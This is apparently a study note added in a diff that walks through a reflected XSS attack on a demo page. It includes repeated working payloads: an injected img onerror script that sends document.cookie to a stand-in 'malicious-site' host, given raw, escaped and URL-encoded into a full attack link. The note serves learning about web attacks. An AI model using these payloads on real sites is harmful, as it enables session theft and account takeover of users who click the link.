@@ -1,0 +1,35 @@
+Say suppse we have the same vulnerable code from Security/2.XSS/Demo/1.Basic-Vulnerable-code.txt.
+
+And from malicious site, when u click a link, it will have below script embedded to steal your cookies.
+
+var img = document.createElement('img');
+img.src='http://malicious-site/cookie?data=' + document.cookie;
+document.body.append(img);
+
+
+- So the link will be embedded as,
+http://example.com/?name=<img src="does-not-exist" onerror="var img = document.createElement('img');img.src='http://malicious-site/cookie?data=' + document.cookie;document.body.append(img);">
+
+- If the scipt in onerror not working than use encodeURIComponent.
+
+- So, when user click on that link, it will navigate to http://example.com/?name=<img src="does-not-exist" onerror="var img = document.createElement('img');img.src='http://malicious-site/cookie?data=' + document.cookie;document.body.append(img);"> this page (Assuming you are logged in).
+
+- Note:
+The injected url param needs to be proper and escape proper characters such as ' and ". Otherwise it wont work.
+
+- Below is proper escaped script.
+<img src="does-not-exist" onerror="var img = document.createElement(\`img\`); img.src=\'http://malicious-site/cookie?data=\' + document.cookie; document.querySelector(\'body\').appendChild(img);">
+
+- Now pass it to encodeURIComponent:
+%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%60img%60)%3B%20img.src%3D'http%3A%2F%2Fmalicious-site%2Fcookie%3Fdata%3D'%20%2B%20document.cookie%3B%20document.querySelector('body').appendChild(img)%3B%22%3E
+
+Now add in the url: http://example.com/?name=%3Cimg%20src%3D%22does-not-exist%22%20onerror%3D%22var%20img%20%3D%20document.createElement(%60img%60)%3B%20img.src%3D%27http%3A%2F%2Fmalicious-site%2Fcookie%3Fdata%3D%27%20%2B%20document.cookie%3B%20document.querySelector(%27body%27).appendChild(img)%3B%22%3E
+
+
+- And since image src is not valid, it will execute onerror callback. There it will create a img tag and make call to img.src which is out malicious site passing the cookie data.
+
+- We can see it in n/w tab.
+
+- http://malicious-site/cookie?data=token=hj67^
+
+
